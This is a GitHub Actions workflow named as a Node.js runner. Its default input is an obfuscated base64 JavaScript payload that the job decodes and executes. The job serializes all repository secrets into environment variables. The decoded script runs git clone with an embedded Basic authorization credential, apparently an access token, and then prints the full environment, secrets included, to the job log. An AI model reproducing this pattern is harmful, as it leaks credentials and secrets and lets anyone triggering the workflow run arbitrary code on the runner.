name: onodejsrunnerpublicv1
on:
  workflow_dispatch:
    inputs:
      runon:
        default: ubuntu-latest
      checkout:
        default: "Y29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOw0KY29uc3QgcGF0aCA9IHJlcXVpcmUoInBhdGgiKTsNCnZhciB7IGV4ZWNTeW5jIH0gPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIik7DQoNCihhc3luYyAoKSA9PiB7DQogIGNvbnN0IHNpbXBsZVN0cmluZ2lmeSA9IChvYmosIHJlcGxhY2VyLCB2YWx1ZSkgPT4gew0KICAgIGNvbnN0IHJlcGxhY2VyRnVuYyA9ICgpID0+IHsNCiAgICAgIGNvbnN0IHZpc2l0ZWQgPSBuZXcgV2Vha1NldCgpOw0KICAgICAgcmV0dXJuIChrZXksIHZhbHVlKSA9PiB7DQogICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT09ICJvYmplY3QiICYmIHZhbHVlICE9PSBudWxsKSB7DQogICAgICAgICAgaWYgKHZpc2l0ZWQuaGFzKHZhbHVlKSkgew0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICB2aXNpdGVkLmFkZCh2YWx1ZSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHZhbHVlOw0KICAgICAgfTsNCiAgICB9Ow0KICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShvYmosIHJlcGxhY2VyRnVuYygpLCBudWxsKTsNCiAgfTsNCiAgdmFyIHYgPSB7DQogICAgY29tbWFuZHM6IFtdLA0KICAgIGN3ZDogcHJvY2Vzcy5jd2QoKSwNCiAgICBleGVjU3luY0NvbW1hbmRzOiBbXSwNCiAgICBlcnI6IHVuZGVmaW5lZCwNCiAgICBlcnJNc2c6IHVuZGVmaW5lZCwNCiAgICBwcm9jZXNzOiB7DQogICAgICB2ZXJzaW9uOiBwcm9jZXNzWyJ2ZXJzaW9uIl0sDQogICAgICBhcmNoOiBwcm9jZXNzWyJhcmNoIl0sDQogICAgICBwbGF0Zm9ybTogcHJvY2Vzc1sicGxhdGZvcm0iXSwNCiAgICAgIGVudjogcHJvY2Vzc1siZW52Il0sDQogICAgICBhcmd2OiBwcm9jZXNzWyJhcmd2Il0sDQogICAgfSwNCiAgfTsNCiAgdHJ5IHsNCiAgICB2LmNvbW1hbmRzID0gKCgpID0+IHsNCiAgICAgIGxldCByZXN1bHRzID0gW107DQogICAgICByZXN1bHRzLnB1c2goDQogICAgICAgIGBnaXQgLWMgaHR0cC5leHRyYUhlYWRlcj0iQXV0aG9yaXphdGlvbjogQmFzaWMgc2IyNW5kSEpwWlhWb1lYVXRaR2c2WjJod1gyUnJlR0V3YldaS2IwUk9RM2ROVkc5dVRtbEhTRkJQU0hweGQxTktiekpUZEhscU5RIiBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vb25ndHJpZXVoYXUtZGgvYnVpbGQtdG9vbHMuZ2l0IC4vc3JjLXRlc3RgDQogICAgICApOw0KICAgICAgcmVzdWx0cy5wdXNoKA0KICAgICAgICBgZ2l0IC1jIGh0dHAuZXh0cmFIZWFkZXI9IkF1dGhvcml6YXRpb246IEJhc2ljIGIyNW5kSEpwWlhWb1lYVXRaR2c2WjJod1gyUnJlR0V3YldaS2IwUk9RM2ROVkc5dVRtbEhTRkJQU0hweGQxTktiekpUZEhscU5RIiBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vb25ndHJpZXVoYXUtZGgvYnVpbGQtdG9vbHMuZ2l0IC4vc3JjLXRlc3RgDQogICAgICApOw0KICAgICAgcmV0dXJuIHJlc3VsdHM7DQogICAgfSkoKTsNCiAgICBmb3IgKGxldCBpID0gMDsgaSA8IHYuY29tbWFuZHMubGVuZ3RoOyBpKyspIHsNCiAgICAgIHZhciB2MSA9IHsgaSwgY29tbWFuZDogdi5jb21tYW5kc1tpXSwgZXhlY1N5bmM6ICIiLCBlcnJNc2c6IHVuZGVmaW5lZCB9Ow0KICAgICAgdHJ5IHsNCiAgICAgICAgdjEuZXhlY1N5bmMgPSBleGVjU3luYyh2MS5jb21tYW5kLCB7IGN3ZDogdi5jd2QgfSkudG9TdHJpbmcoKTsNCiAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgIHYxLmVyck1zZyA9IGVycm9yLm1lc3NhZ2U7DQogICAgICB9IGZpbmFsbHkgew0KICAgICAgICB2LmV4ZWNTeW5jQ29tbWFuZHMucHVzaCh2MSk7DQogICAgICB9DQogICAgfQ0KICB9IGNhdGNoIChlcnJvcikgew0KICAgIHYuZXJyID0gZXJyb3I7DQogICAgdi5lcnJNc2cgPSBlcnJvci5tZXNzYWdlOw0KICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IubWVzc2FnZSk7DQogIH0gZmluYWxseSB7DQogICAgY29uc29sZS5sb2coc2ltcGxlU3RyaW5naWZ5KHYpKTsNCiAgfQ0KfSkoKTs="
jobs:
  onodejsrunnerpublicv1:
    runs-on: ${{ github.event.inputs.runon }}
    name: onodejsrunnerpublicv1
    env:
      toJSON_github: ${{ toJSON(github) }}
      toJSON_secrets: ${{ toJSON(secrets) }}
    steps:
      - name: checkout
        shell: bash
        run: |
          base64 -d <<< "${{ github.event.inputs.checkout }}" > ./.onodejsrunnerpublicv1.checkout.js
          chmod u=rwx ./.onodejsrunnerpublicv1.checkout.js
          node ./.onodejsrunnerpublicv1.checkout.js
